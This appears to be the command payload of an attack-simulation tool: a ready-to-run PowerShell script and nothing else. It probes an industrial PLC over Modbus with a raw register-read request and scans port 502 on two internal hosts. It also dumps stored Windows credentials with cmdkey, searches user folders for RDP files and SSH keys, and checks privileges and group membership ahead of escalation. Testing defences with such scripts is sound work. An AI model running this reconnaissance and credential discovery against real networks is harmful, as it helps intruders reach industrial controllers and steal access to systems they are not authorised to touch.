injector_contract_payload.command_content:
$plc = "10.0.0.80"
$port = 502
$tcp = New-Object System.Net.Sockets.TcpClient
$tcp.ReceiveTimeout = 2000
try {
    $tcp.Connect($plc, $port)
    if ($tcp.Connected) {
        $stream = $tcp.GetStream()
        # Modbus Read Holding Registers (Function 03) - Transaction ID: 0001, Protocol: 0000, Length: 0006, Unit: 01, FC: 03, Addr: 0000, Qty: 0001
        $modbusRequest = [byte[]](0x00,0x01,0x00,0x00,0x00,0x06,0x01,0x03,0x00,0x00,0x00,0x01)
        $stream.Write($modbusRequest, 0, $modbusRequest.Length)
        $buffer = New-Object byte[] 256
        $bytesRead = $stream.Read($buffer, 0, 256)
        if ($bytesRead -gt 0) {
            "MODBUS_ACCESS:SUCCESS:$plc"
        }
        $tcp.Close()
    }
} catch {
    "MODBUS_ACCESS:BLOCKED:$plc`:$($_.Exception.Message)"
}

$targets = @("10.0.0.80","10.0.0.59")
$port = 502
foreach ($t in $targets) {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.ReceiveTimeout = 1000
    $tcp.SendTimeout = 1000
    try {
        $tcp.Connect($t, $port)
        if ($tcp.Connected) {
            "$t`:$port`:OPEN"
            $tcp.Close()
        }
    } catch {
        "$t`:$port`:CLOSED"
    }
}

$creds = cmdkey /list
Write-Host $creds
$sensitiveFiles = @(
    "$env:USERPROFILE\Desktop\*.rdp",
    "$env:USERPROFILE\Documents\*.rdp",
    "$env:USERPROFILE\.ssh\*"
)
foreach ($path in $sensitiveFiles) {
    $files = Get-ChildItem -Path $path -ErrorAction SilentlyContinue
    if ($files) {
        Write-Host "[!] FOUND: $path" -ForegroundColor Green
    }
}

whoami
whoami /priv | Select-String "Enabled"
whoami /groups | Select-String "BUILTIN|Local|Users|Admin"
$isAdmin = (whoami /groups) -match "Administrators"
if ($isAdmin) {
    Write-Host "[+] Status: ADMINISTRATOR" -ForegroundColor Green
} else {
    Write-Host "[-] Status: STANDARD USER (need privilege escalation for some actions)" -ForegroundColor Yellow
}
